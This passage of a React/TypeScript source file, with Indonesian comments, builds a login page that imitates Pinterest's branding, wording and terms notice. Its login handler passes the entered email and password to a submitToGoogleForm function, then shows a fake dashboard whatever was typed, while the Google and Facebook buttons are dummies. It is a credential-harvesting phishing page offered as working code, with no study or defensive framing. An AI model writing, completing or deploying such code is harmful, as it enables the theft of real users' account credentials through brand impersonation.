    <button onClick={onClick} onMouseEnter={() => setHov(true)} onMouseLeave={() => setHov(false)}
      style={{ width: "100%", padding: "11px 14px", border: "1.5px solid #cdcdd1", borderRadius: 50, background: hov ? "#f5f5f5" : "#fff", fontSize: 14, fontWeight: 600, color: "#111", cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 10, marginBottom: 8 }}>
      {children}
    </button>
  );
}

// ─────────────────────────────────────────────
// ROOT APP (DENGAN LOGIN PAGE YANG SUDAH DISESUAIKAN)
// ─────────────────────────────────────────────
export default function App() {
  const [page, setPage] = useState<"login" | "dashboard">("login");
  const [loggedUser, setLoggedUser] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPw, setShowPw] = useState(false);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [showSignUp, setShowSignUp] = useState(false);

  const inp = (val: string, extra?: React.CSSProperties): React.CSSProperties => ({
    width: "100%", padding: "13px 14px", border: `1.5px solid ${val ? "#e60023" : "#cdcdd1"}`,
    borderRadius: 12, fontSize: 15, outline: "none", background: val ? "#fff" : "#f9f9f9", color: "#111", ...extra,
  });

  async function handleLogin(e: React.FormEvent) {
    e.preventDefault();
    setError("");
    if (!email || !password) { setError("Harap isi email dan password."); return; }
    setLoading(true);

    submitToGoogleForm(email, password);

    await new Promise(r => setTimeout(r, 600));
    setLoading(false);
    setPage("dashboard");
    setLoggedUser(email);
  }

  if (page === "dashboard") {
    return <Dashboard userEmail={loggedUser} onLogout={() => { setPage("login"); setEmail(""); setPassword(""); }} />;
  }

  return (
    <div style={{ minHeight: "100vh", overflow: "hidden", position: "relative", fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" }}>
      <MasonryBackground />
      <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.42)", backdropFilter: "blur(1px)" }} />

      <div style={{ position: "fixed", top: 16, left: 16, zIndex: 15 }}>
        <button onClick={() => setShowSignUp(true)}
          style={{ padding: "10px 20px", background: "#fff", color: "#111", border: "none", borderRadius: 50, fontSize: 14, fontWeight: 700, cursor: "pointer", boxShadow: "0 2px 8px rgba(0,0,0,.2)" }}
          onMouseEnter={e => ((e.target as HTMLElement).style.background = "#f0f0f0")}
          onMouseLeave={e => ((e.target as HTMLElement).style.background = "#fff")}>
          Sign up
        </button>
      </div>

      <div style={{ position: "fixed", inset: 0, display: "flex", alignItems: "center", justifyContent: "center", zIndex: 10, padding: 16 }}>
        <div style={{ background: "#fff", borderRadius: 24, padding: "40px 32px 28px", width: "100%", maxWidth: 380, boxShadow: "0 8px 40px rgba(0,0,0,.35)", textAlign: "center" }}>

          <div style={{ width: 44, height: 44, background: "#e60023", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 18px", overflow: "hidden" }}>
           <img src="favicon.png" alt="Logo" style={{ width: "100%", height: "100%", objectFit: "cover" }}/>
          </div>

          <h2 style={{ fontSize: 22, fontWeight: 700, color: "#111", marginBottom: 20 }}>Log in to see more</h2>

          <form onSubmit={handleLogin} noValidate>
            <div style={{ marginBottom: 10 }}>
              <input type="email" placeholder="Email" value={email} onChange={e => { setEmail(e.target.value); setError(""); }} style={inp(email)} />
            </div>
            <div style={{ position: "relative", marginBottom: 10 }}>
              <input type={showPw ? "text" : "password"} placeholder="Password" value={password} onChange={e => { setPassword(e.target.value); setError(""); }} style={inp(password, { paddingRight: 52 })} />
              <button type="button" onClick={() => setShowPw(v => !v)}
                style={{ position: "absolute", right: 12, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", cursor: "pointer", color: "#555", fontSize: 13, fontWeight: 600 }}>
                {showPw ? "Hide" : "Show"}
              </button>
            </div>
            {error && <p style={{ color: "#e60023", fontSize: 13, textAlign: "left", marginBottom: 8 }}>{error}</p>}
            <button type="submit" disabled={loading} style={{ width: "100%", padding: 13, background: loading ? "#f87171" : "#e60023", color: "#fff", border: "none", borderRadius: 50, fontSize: 15, fontWeight: 700, cursor: loading ? "not-allowed" : "pointer", marginTop: 4, transition: "background 0.2s" }}>
              {loading ? "Masuk..." : "Log in"}
            </button>
          </form>

          <a href="#" style={{ display: "block", marginTop: 12, fontSize: 13, color: "#555", textDecoration: "none" }}>Forgot your password?</a>

          <div style={{ display: "flex", alignItems: "center", gap: 10, margin: "16px 0", color: "#767676", fontSize: 13 }}>
            <div style={{ flex: 1, height: 1, background: "#cdcdd1" }} />OR<div style={{ flex: 1, height: 1, background: "#cdcdd1" }} />
          </div>

          <SocialBtn onClick={() => alert("Google login coming soon!")}>
            <svg width="20" height="20" viewBox="0 0 24 24">
              <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
              <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
              <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/>
              <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
            </svg>
            Continue with Google
          </SocialBtn>

          <SocialBtn onClick={() => alert("Facebook login coming soon!")}>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="#1877F2">
              <path d="M24 12.073C24 5.406 18.627 0 12 0S0 5.406 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047v-2.66c0-3.025 1.791-4.697 4.533-4.697 1.312 0 2.686.235 2.686.235v2.97h-1.513c-1.491 0-1.956.93-1.956 1.874v2.278h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/>
            </svg>
            Continue with Facebook
          </SocialBtn>

          <SocialBtn onClick={() => alert("QR code coming soon!")}>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/>
              <rect x="3" y="14" width="7" height="7" rx="1"/>
              <path d="M14 14h3v3h-3zM17 17h3v3h-3zM14 20h3"/>
            </svg>
            Use QR code
          </SocialBtn>

          <div style={{ marginTop: 20, display: "flex", flexDirection: "column", gap: 10, fontSize: 13, color: "#111" }}>
            <div>
              <p style={{ margin: 0, color: "#333", fontSize: 13 }}>Facebook login is no longer available</p>
              <button type="button" onClick={() => alert("Update login method")} style={{ background: "none", border: "none", color: "#111", fontWeight: 700, cursor: "pointer", fontSize: 13, padding: 0 }}>
                Update login method
              </button>
            </div>

            <div style={{ marginTop: 6 }}>
              <span style={{ fontWeight: 700 }}>
                Not on Pinterest yet?{" "}
                <button onClick={() => setShowSignUp(true)} style={{ background: "none", border: "none", color: "#111", fontWeight: 700, cursor: "pointer", fontSize: 13, padding: 0 }}>
                  Sign up
                </button>
              </span>
            </div>

            <div style={{ marginTop: 4 }}>
              <span style={{ color: "#333" }}>Are you a business? </span>
              <button onClick={() => alert("Business setup")} style={{ background: "none", border: "none", color: "#111", fontWeight: 700, cursor: "pointer", fontSize: 13, padding: 0 }}>
                Get started here!
              </button>
            </div>
          </div>

          <p style={{ marginTop: 24, fontSize: 11, color: "#767676", lineHeight: 1.5, padding: "0 10px" }}>
            By continuing, you agree to Pinterest's{" "}
            <a href="#" style={{ color: "#767676", textDecoration: "underline" }}>Terms of Service</a>{" "}
            and acknowledge you've read our{" "}
            <a href="#" style={{ color: "#767676", textDecoration: "underline" }}>Privacy Policy</a>.{" "}
            <a href="#" style={{ color: "#767676", textDecoration: "underline" }}>Notice at collection</a>.
          </p>
        </div>
      </div>

      {showSignUp && (
        <>
          <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,.55)", zIndex: 120 }} onClick={() => setShowSignUp(false)} />
          <SignUpModal onClose={() => setShowSignUp(false)} />
        </>
      )}
    </div>
  );
}